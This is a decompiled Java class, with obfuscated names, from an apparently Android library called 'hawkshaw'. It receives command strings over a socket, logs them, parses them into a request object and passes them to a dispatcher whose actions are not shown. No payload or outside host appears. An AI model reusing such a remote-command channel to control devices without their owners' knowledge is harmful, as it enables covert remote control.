package com.hawkshaw.library.datalayer.network.socket;

import F3.b;
import W2.y;
import Y1.C0110h;
import a3.e;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.datalayer.models.SocketCommandRequest;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import i3.p;
import t3.E;

public final class a extends C0331i implements p {

    /* renamed from: D  reason: collision with root package name */
    public int f4927D;

    /* renamed from: E  reason: collision with root package name */
    public final /* synthetic */ String f4928E;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public a(String str, e eVar) {
        super(2, eVar);
        this.f4928E = str;
    }

    public final e create(Object obj, e eVar) {
        return new a(this.f4928E, eVar);
    }

    public final Object invoke(Object obj, Object obj2) {
        return ((a) create((E) obj, (e) obj2)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        String str = this.f4928E;
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f4927D;
        if (i5 == 0) {
            C0110h.P(obj);
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            Logger.d$default(Logger.INSTANCE, "SocketCommandResolver", "Socket Command Received: ".concat(str), false, 4, (Object) null);
            this.f4927D = 1;
            if (SocketCommandResolverKt.handleSocketCommand((SocketCommandRequest) json.a(SocketCommandRequest.Companion.serializer(), str), this) == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            try {
                C0110h.P(obj);
            } catch (Exception e5) {
                Exception exc = e5;
                Logger.e$default(Logger.INSTANCE, "SocketCommandResolver", C0528x.h("HandleSocketCommand: ", exc.getMessage()), exc, false, 8, (Object) null);
            }
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return y.f2418a;
    }
}
